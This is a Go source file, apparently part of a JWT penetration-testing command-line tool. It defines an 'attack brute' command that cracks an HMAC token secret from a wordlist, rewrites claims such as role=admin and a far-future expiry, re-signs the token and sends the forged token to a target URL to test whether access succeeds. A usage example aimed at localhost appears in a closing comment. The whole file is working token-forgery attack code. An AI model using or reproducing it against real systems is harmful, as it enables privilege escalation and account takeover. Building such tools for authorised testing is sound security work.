package cmd

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"fmt"
	"hash"
	"strings"

	"github.com/pikqi/jwtool/internal"
	"github.com/spf13/cobra"
)

var attackBruteCmd = &cobra.Command{
	Use:   "brute <JWT>",
	Short: "Brute force secret, optionally modify claims, re-sign and send",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		url, _ := cmd.Flags().GetString("url")
		cookie, _ := cmd.Flags().GetString("cookie")
		keyword, _ := cmd.Flags().GetString("keyword")
		wordlist, _ := cmd.Flags().GetString("wordlist")
		setFlags, _ := cmd.Flags().GetStringArray("set")

		if wordlist == "" {
			return fmt.Errorf("--wordlist is required for brute force attacks")
		}

		// prvi deo: brute force
		fmt.Println("[*] Brute forcing secret...")
		result, err := internal.Bruteforce(args[0], wordlist)
		if err != nil {
			return fmt.Errorf("Bruteforce failed: %w", err)
		}

		fmt.Printf("[*] Tried %d secrets in %s\n", result.Tried, result.Duration)

		if result.Secret == "" {
			fmt.Println("Secret not found - cannot proceed")
			return nil
		}
		fmt.Printf("Secret found: %q\n", result.Secret)

		// drugi deo: parsiranje --set flagova
		overrides := map[string]string{}
		for _, s := range setFlags {
			parts := strings.SplitN(s, "=", 2)
			if len(parts) != 2 {
				return fmt.Errorf("Invalid --set value %q: expected key=value", s)
			}
			overrides[parts[0]] = parts[1]
		}

		// treci deo: modifikacija payloada
		jwt := args[0]
		var newPayload string

		if len(overrides) > 0 {
			fmt.Println("[*] Modifying claims...")
			for k, v := range overrides {
				fmt.Printf("	%s => %s\n", k, v)
			}
			newPayload, err = internal.ModifyClaims(jwt, overrides)
			if err != nil {
				return fmt.Errorf("Failed to modify claims: %w", err)
			}
		} else {
			newPayload = strings.SplitN(strings.TrimSpace(jwt), ".", 3)[1]
		}

		// cetvrti deo: re-sign sa nadjenim secretom
		header, err := internal.ParseJWTHeader(jwt)
		if err != nil {
			return fmt.Errorf("Failed to parse header: %w", err)
		}

		originalParts := strings.SplitN(strings.TrimSpace(jwt), ".", 3)
		signingInput := originalParts[0] + "." + newPayload

		var h func() hash.Hash
		switch header.Alg {
		case "HS256":
			h = sha256.New
		case "HS384":
			h = sha512.New384
		case "HS512":
			h = sha512.New
		default:
			return fmt.Errorf("Unsupported algorithm: %s", header.Alg)
		}

		mac := hmac.New(h, []byte(result.Secret))
		mac.Write([]byte(signingInput))
		newSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
		forged := signingInput + "." + newSig

		fmt.Println("[*] Forged token:", forged)

		// peti deo: full send
		fmt.Printf("[*] Sending to %s...\n", url)
		attackResult, err := internal.SendWithJWT(url, forged, internal.SendOpts{
			CookieName: cookie,
			Keyword:    keyword,
		})
		if err != nil {
			return fmt.Errorf("Request failed: %w", err)
		}

		if attackResult.Success {
			fmt.Printf("Attack succeeded - %s\n", attackResult.Reason)
		} else {
			fmt.Printf("Attack failed - %s\n", attackResult.Reason)
		}

		return nil
	},
}

func init() {
	attackBruteCmd.Flags().StringP("wordlist", "w", "", "Path to wordlist file")
	attackBruteCmd.Flags().StringArray("set", []string{}, "Override a claim: --set role=admin (repeatable)")
	attackCmd.AddCommand(attackBruteCmd)
}

/*
jwtool attack brute <JWT> \
  --url http://localhost:5010/dashboard \
  --cookie jwt_token \
  --keyword "Welcome" \
  --wordlist ./wordlist.txt \
  --set role=admin \
  --set exp=9999999999
*/
